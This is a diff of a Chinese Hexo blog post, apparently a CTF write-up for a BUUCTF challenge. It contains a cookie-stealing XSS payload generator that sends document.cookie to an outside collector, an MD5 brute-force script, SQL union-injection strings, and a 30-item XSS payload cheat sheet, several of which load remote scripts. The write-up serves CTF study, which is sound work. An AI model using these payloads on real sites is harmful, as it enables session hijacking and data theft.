@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://oight.github.io/img/1.jpg">
 <meta property="article:published_time" content="2024-12-19T06:04:25.000Z">
-<meta property="article:modified_time" content="2024-12-20T06:15:11.957Z">
+<meta property="article:modified_time" content="2024-12-20T06:17:50.860Z">
 <meta property="article:author" content="Oight">
 <meta property="article:tag" content="周报">
 <meta name="twitter:card" content="summary">
@@ -146,7 +146,7 @@
   isHighlightShrink: false,
   isToc: true,
   isShuoshuo: false
-}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Welcome！This is Oight！</span></a><a class="nav-page-title" href="/"><span class="site-name">RCE，XSS</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">RCE，XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-19T06:04:25.000Z" title="发表于 2024-12-19 14:04:25">2024-12-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-20T06:15:11.957Z" title="更新于 2024-12-20 14:15:11">2024-12-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h1><h2 id="记录一道关于PHP函数漏洞利用的题目"><a href="#记录一道关于PHP函数漏洞利用的题目" class="headerlink" title="记录一道关于PHP函数漏洞利用的题目"></a>记录一道关于PHP函数漏洞利用的题目</h2><blockquote>
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Welcome！This is Oight！</span></a><a class="nav-page-title" href="/"><span class="site-name">RCE，XSS</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">RCE，XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-19T06:04:25.000Z" title="发表于 2024-12-19 14:04:25">2024-12-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-20T06:17:50.860Z" title="更新于 2024-12-20 14:17:50">2024-12-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h1><h2 id="记录一道关于PHP函数漏洞利用的题目"><a href="#记录一道关于PHP函数漏洞利用的题目" class="headerlink" title="记录一道关于PHP函数漏洞利用的题目"></a>记录一道关于PHP函数漏洞利用的题目</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">题目在这里</a>  </p>
 </blockquote>
 <p>创建实例显示源代码如下：  </p>
@@ -209,93 +209,51 @@ escapeshellcmd()
 <p>我们得知这里存在一个admin.php,访问提示不是管理员无法查看（果然）  </p>
 <p>于是我们尝试进行XSS攻击。发现这里还存在WAF，会将’’(‘’转义成”（”  </p>
 <p>使用这个脚本  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">in_str = &quot;(function()&#123;window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)());&#125;)();&quot;</span><br><span class="line"></span><br><span class="line">output = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for c in in_str:</span><br><span class="line">    output += &quot;&amp;#&quot; + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</span><br><span class="line">```  </span><br><span class="line">生成payload后提交，得到url后进反馈  </span><br><span class="line"></span><br><span class="line">输入得到的url（题目提示要把靶机域名改为web）接下来解决验证码问题，题目中给出*substr(md5($str), 0, 6) === “cfde39”：*  </span><br><span class="line">这是一个MD5弱比较，使用下面这个脚本来生成验证码  </span><br></pre></td></tr></table></figure>
-<p>import hashlib<br>import random<br>import string</p>
-<p>target &#x3D; “cfde39”</p>
-<p>while True:<br>    # 生成一个随机字符串 (4 个字符)<br>    s &#x3D; ‘’.join(random.choices(string.ascii_letters + string.digits, k&#x3D;8))<br>    hash_value &#x3D; hashlib.md5(s.encode()).hexdigest()[:6]<br>    if hash_value &#x3D;&#x3D; target:<br>        print(f”Found: {s}”)<br>        break</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">由于题目中提供的xss.buuoj.cn已经停止服务了，所以我们还要自己搭建一个用于接收反馈的平台  </span><br><span class="line"></span><br><span class="line">&gt; 项目地址：[XSS数据接收平台（无SQL版）](https://github.com/firesunCN/BlueLotus_XSSReceiver)  </span><br><span class="line"></span><br><span class="line">使用小皮面板来搭建这个平台，可惜的是搭建好后我的模板都神奇地消失了，一开始以为是Windows Defender的问题（虽然确实），但关掉之后还是没有js模板，导致平台一直没法用，只能止步于此了。  </span><br><span class="line"></span><br><span class="line">如果顺利的话，可以截取到管理员的SESSID，从而成功登录到admin.php，然后用</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;&lt;code&gt;-2 union select 1,2,3#</span><br><span class="line"></span><br><span class="line">-2 union select 1,database(),user()#</span><br><span class="line"></span><br><span class="line">-2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ciscn&#x27;#</span><br><span class="line"></span><br><span class="line">-2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#</span><br><span class="line"></span><br><span class="line">-2 union select 1,2,group_concat(flagg) from ciscn.flag#</span><br><span class="line">&lt;/code&gt;&lt;/pre&gt;</span><br><span class="line">SQL联合查询得到flag  </span><br><span class="line"></span><br><span class="line">这里记录一些常见的XSS攻击代码  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>(1)普通的XSS JavaScript注入</p>
-<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
+<pre><code>in_str = &quot;(function()&#123;window.location.href=&#39;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation=&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;cookie=&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;opener=&#39;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)());&#125;)();&quot;
 
-<p>(2)IMG标签XSS使用JavaScript命令</p>
-<IMG SRC=http://3w.org/XSS/xss.js/>
+output = &quot;&quot;
 
-<p>(3)IMG标签无分号无引号</p>
-<p>&lt;IMG SRC&#x3D;javascript:alert(‘XSS’)&gt;</p>
-<p>(4)IMG标签大小写不敏感</p>
-<p>&lt;IMG SRC&#x3D;JaVaScRiPt:alert(‘XSS’)&gt;</p>
-<p>(5)HTML编码(必须有分号)</p>
-<p>&lt;IMG SRC&#x3D;javascript:alert(“XSS”)&gt;</p>
-<p>(6)修正缺陷IMG标签</p>
-<p>&lt;IMG “””&gt;<SCRIPT>alert("XSS")</SCRIPT>“&gt;</p>
-<p>(7)formCharCode标签(计算器)</p>
-<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+for c in in_str:
+    output += &quot;&amp;#&quot; + str(ord(c))
 
-<p>(8)UTF-8的Unicode编码(计算器)</p>
-<p>&lt;IMG SRC&#x3D;jav..省略..S’)&gt;</p>
-<p>(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</p>
-<p>&lt;IMG SRC&#x3D;jav..省略..S’)&gt;</p>
-<p>(10)十六进制编码也是没有分号(计算器)</p>
-<IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>
+print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)
+</code></pre>
+<p>生成payload后提交，得到url后进反馈  </p>
+<p>输入得到的url（题目提示要把靶机域名改为web）接下来解决验证码问题，题目中给出<em>substr(md5($str), 0, 6) &#x3D;&#x3D;&#x3D; “cfde39”：</em><br>这是一个MD5弱比较，使用下面这个脚本来生成验证码  </p>
+<pre><code>import hashlib
+import random
+import string
 
-<p>(11)嵌入式标签,将Javascript分开</p>
-<IMG SRC="jav ascript:alert('XSS');">
+target = "cfde39"
 
-<p>(12)嵌入式编码标签,将Javascript分开</p>
-<IMG SRC="jav ascript:alert('XSS');">
+while True:
+    # 生成一个随机字符串 (4 个字符)
+    s = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    hash_value = hashlib.md5(s.encode()).hexdigest()[:6]
+    if hash_value == target:
+        print(f"Found: &#123;s&#125;")
+        break
 
-<p>(13)嵌入式换行符</p>
-<IMG SRC="jav ascript:alert('XSS');">
+</code></pre>
+<p>由于题目中提供的xss.buuoj.cn已经停止服务了，所以我们还要自己搭建一个用于接收反馈的平台  </p>
+<blockquote>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">XSS数据接收平台（无SQL版）</a>  </p>
+</blockquote>
+<p>使用小皮面板来搭建这个平台，可惜的是搭建好后我的模板都神奇地消失了，一开始以为是Windows Defender的问题（虽然确实），但关掉之后还是没有js模板，导致平台一直没法用，只能止步于此了。  </p>
+<p>如果顺利的话，可以截取到管理员的SESSID，从而成功登录到admin.php，然后用</p>
+<pre><code>-2 union select 1,2,3#
 
-<p>(14)嵌入式回车</p>
-<IMG SRC="jav ascript:alert('XSS');">
+-2 union select 1,database(),user()#
 
-<p>(15)嵌入式多行注入JavaScript,这是XSS极端的例子</p>
-<IMG SRC="javascript:alert('XSS')">
+-2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ciscn'#
 
-<p>(16)解决限制字符(要求同页面)</p>
-<script>z='document.'</script><script>z=z+'write("'</script><script>z=z+'<script'</script><script>z=z+' src=ht'</script><script>z=z+'tp://ww'</script><script>z=z+'w.shell'</script><script>z=z+'.net/1.'</script><script>z=z+'js></sc'</script><script>z=z+'ript>")'</script><script>eval_r(z)</script>
+-2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'#
 
-<p>(17)空字符12-7-1 T00LS - Powered by Discuz! Board</p>
-<p><a target="_blank" rel="noopener" href="https://www.a.com/viewthread.php?action=printable&tid=15267">https://www.a.com/viewthread.php?action=printable&amp;tid=15267</a> 2&#x2F;6perl -e ‘print “&lt;IMG SRC&#x3D;java\0script:alert(&quot;XSS&quot;)&gt;”;’ &gt; out</p>
-<p>(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</p>
-<p>perl -e ‘print “&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCR\0IPT&gt;”;’ &gt; out</p>
-<p>(19)Spaces和meta前的IMG标签</p>
-<IMG SRC=" javascript:alert('XSS');">
-
-<p>(20)Non-alpha-non-digit XSS</p>
-<p>&lt;SCRIPT&#x2F;XSS SRC&#x3D;”<a target="_blank" rel="noopener" href="http://3w.org/XSS/xss.js%22%3E">http://3w.org/XSS/xss.js&quot;&gt;</a></SCRIPT></p>
-<p>(21)Non-alpha-non-digit XSS to 2</p>
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
-
-<p>(22)Non-alpha-non-digit XSS to 3</p>
-<p>&lt;SCRIPT&#x2F;SRC&#x3D;”<a target="_blank" rel="noopener" href="http://3w.org/XSS/xss.js%22%3E">http://3w.org/XSS/xss.js&quot;&gt;</a></SCRIPT></p>
-<p>(23)双开括号</p>
-<p>&lt;<SCRIPT>alert("XSS");//<</SCRIPT></p>
-<p>(24)无结束脚本标记(仅火狐等浏览器)</p>
-<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
-
-(25)无结束脚本标记2
-
-<SCRIPT SRC=//3w.org/XSS/xss.js>
-
-(26)半开的HTML/JavaScript XSS
-
-<IMG SRC="javascript:alert('XSS')"
-
-(27)双开角括号
-
-<iframe src=http://3w.org/XSS.html <
-
-(28)无单引号 双引号 分号
-
-<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
-
-<p>(29)换码过滤的JavaScript</p>
-<p>&quot;;alert(‘XSS’);&#x2F;&#x2F;</p>
-<p>(30)结束Title标签</p>
-</TITLE><SCRIPT>alert("XSS");</SCRIPT>
-``` 
+-2 union select 1,2,group_concat(flagg) from ciscn.flag#
+</code></pre>
+<p>SQL联合查询得到flag  </p>
+<p>这里记录一些常见的XSS攻击代码  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">(1)普通的XSS JavaScript注入</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(2)IMG标签XSS使用JavaScript命令</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=http://3w.org/XSS/xss.js/&gt;</span><br><span class="line"></span><br><span class="line">(3)IMG标签无分号无引号</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(4)IMG标签大小写不敏感</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(5)HTML编码(必须有分号)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;</span><br><span class="line"></span><br><span class="line">(6)修正缺陷IMG标签</span><br><span class="line"></span><br><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">(7)formCharCode标签(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line"></span><br><span class="line">(8)UTF-8的Unicode编码(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(10)十六进制编码也是没有分号(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line"></span><br><span class="line">(11)嵌入式标签,将Javascript分开</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(12)嵌入式编码标签,将Javascript分开</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(13)嵌入式换行符</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(14)嵌入式回车</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">(16)解决限制字符(要求同页面)</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=&#x27;document.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;write(&quot;&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;&lt;script&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27; src=ht&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;tp://ww&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;w.shell&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;.net/1.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;js&gt;&lt;/sc&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;ript&gt;&quot;)&#x27;&lt;/script&gt;&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">(17)空字符12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line"></span><br><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 2/6perl -e &#x27;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</span><br><span class="line"></span><br><span class="line">perl -e &#x27;print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line">(19)Spaces和meta前的IMG标签</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot; javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(20)Non-alpha-non-digit XSS</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(21)Non-alpha-non-digit XSS to 2</span><br><span class="line"></span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line"></span><br><span class="line">(22)Non-alpha-non-digit XSS to 3</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(23)双开括号</span><br><span class="line"></span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(24)无结束脚本标记(仅火狐等浏览器)</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</span><br><span class="line"></span><br><span class="line">(25)无结束脚本标记2</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br><span class="line"></span><br><span class="line">(26)半开的HTML/JavaScript XSS</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">(27)双开角括号</span><br><span class="line"></span><br><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br><span class="line"></span><br><span class="line">(28)无单引号 双引号 分号</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(29)换码过滤的JavaScript</span><br><span class="line"></span><br><span class="line">\&quot;;alert(&#x27;XSS&#x27;);//</span><br><span class="line"></span><br><span class="line">(30)结束Title标签</span><br><span class="line"></span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000022348467">更多XSS攻击代码</a>  </p>
